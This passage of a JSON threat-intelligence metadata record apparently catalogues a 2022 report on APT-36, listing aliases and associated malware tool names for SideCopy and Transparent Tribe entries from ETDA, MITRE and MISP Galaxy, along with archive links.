        "2022-11-03 - APT-36 Uses New TTPs and New Tools to Target Indian Governmental Organizations.pdf"
    ],
    "threat_actors": [
        {
            "id": "b584b10a-7d54-4d05-9e21-b223563df7b8",
            "created_at": "2022-10-25T16:07:24.181589Z",
            "updated_at": "2025-03-27T02:02:10.134233Z",
            "deleted_at": null,
            "main_name": "SideCopy",
            "aliases": [],
            "source_name": "ETDA:SideCopy",
            "tools": [
                "ActionRAT",
                "AllaKore",
                "Allakore RAT",
                "AresRAT",
                "Bladabindi",
                "CetaRAT",
                "DetaRAT",
                "EpicenterRAT",
                "Jorik",
                "Lilith",
                "Lilith RAT",
                "MargulasRAT",
                "ReverseRAT",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "187a0668-a968-4cf0-8bfd-4bc97c02f6dc",
            "created_at": "2022-10-27T08:27:12.955905Z",
            "updated_at": "2025-03-27T02:00:55.41311Z",
            "deleted_at": null,
            "main_name": "SideCopy",
            "aliases": [
                "SideCopy"
            ],
            "source_name": "MITRE:SideCopy",
            "tools": [
                "AuTo Stealer",
                "Action RAT"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "fce5181c-7aab-400f-bd03-9db9e791da04",
            "created_at": "2022-10-25T15:50:23.759799Z",
            "updated_at": "2025-03-27T02:00:55.540135Z",
            "deleted_at": null,
            "main_name": "Transparent Tribe",
            "aliases": [
                "Transparent Tribe",
                "COPPER FIELDSTONE",
                "APT36",
                "Mythic Leopard",
                "ProjectM"
            ],
            "source_name": "MITRE:Transparent Tribe",
            "tools": [
                "DarkComet",
                "ObliqueRAT",
                "njRAT",
                "Peppy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "c68fa27f-e8d9-4932-856b-467ccfe39997",
            "created_at": "2023-01-06T13:46:38.450585Z",
            "updated_at": "2025-03-27T02:00:02.836543Z",
            "deleted_at": null,
            "main_name": "Operation C-Major",
            "aliases": [
                "C-Major",
                "Transparent Tribe",
                "Mythic Leopard",
                "ProjectM",
                "APT 36",
                "TMP.Lapis",
                "Green Havildar",
                "COPPER FIELDSTONE",
                "APT36",
                "Earth Karkaddan",
                "Storm-0156"
            ],
            "source_name": "MISPGALAXY:Operation C-Major",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "abb24b7b-6baa-4070-9a2b-aa59091097d1",
            "created_at": "2022-10-25T16:07:24.339942Z",
            "updated_at": "2025-03-27T02:02:10.179404Z",
            "deleted_at": null,
            "main_name": "Transparent Tribe",
            "aliases": [
                "APT 36",
                "APT-C-56",
                "Copper Fieldstone",
                "Earth Karkaddan",
                "Green Havildar",
                "Mythic Leopard",
                "Operation C-Major",
                "Operation Honey Trap",
                "Operation Transparent Tribe",
                "ProjectM",
                "STEPPY-KAVACH",
                "Storm-0156",
                "TEMP.Lapis",
                "Transparent Tribe"
            ],
            "source_name": "ETDA:Transparent Tribe",
            "tools": [
                "Amphibeon",
                "Android RAT",
                "Bezigate",
                "Bladabindi",
                "Bozok",
                "Bozok RAT",
                "BreachRAT",
                "Breut",
                "CapraRAT",
                "CinaRAT",
                "Crimson RAT",
                "DarkComet",
                "DarkKomet",
                "ElizaRAT",
                "FYNLOS",
                "Fynloski",
                "Jorik",
                "Krademok",
                "Limepad",
                "Luminosity RAT",
                "LuminosityLink",
                "MSIL",
                "MSIL/Crimson",
                "Mobzsar",
                "MumbaiDown",
                "Oblique RAT",
                "ObliqueRAT",
                "Peppy RAT",
                "Peppy Trojan",
                "Quasar RAT",
                "QuasarRAT",
                "SEEDOOR",
                "Scarimson",
                "SilentCMD",
                "Stealth Mango",
                "UPDATESEE",
                "USBWorm",
                "Waizsar RAT",
                "Yggdrasil",
                "beendoor",
                "klovbot",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a4f0e383-f447-4cd6-80e3-ffc073ed4e00",
            "created_at": "2023-01-06T13:46:39.30167Z",
            "updated_at": "2025-03-27T02:00:03.045082Z",
            "deleted_at": null,
            "main_name": "SideCopy",
            "aliases": [],
            "source_name": "MISPGALAXY:SideCopy",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536031,
    "ts_updated_at": 1743041821,
    "ts_creation_date": 1669662233,
    "ts_modification_date": 1669662233,
    "files": {
        "pdf": "https://archive.orkl.eu/37b3259c46b5c4ad90787f085680f805c08ac202.pdf",
        "text": "https://archive.orkl.eu/37b3259c46b5c4ad90787f085680f805c08ac202.txt",
        "img": "https://archive.orkl.eu/37b3259c46b5c4ad90787f085680f805c08ac202.jpg"
    }
}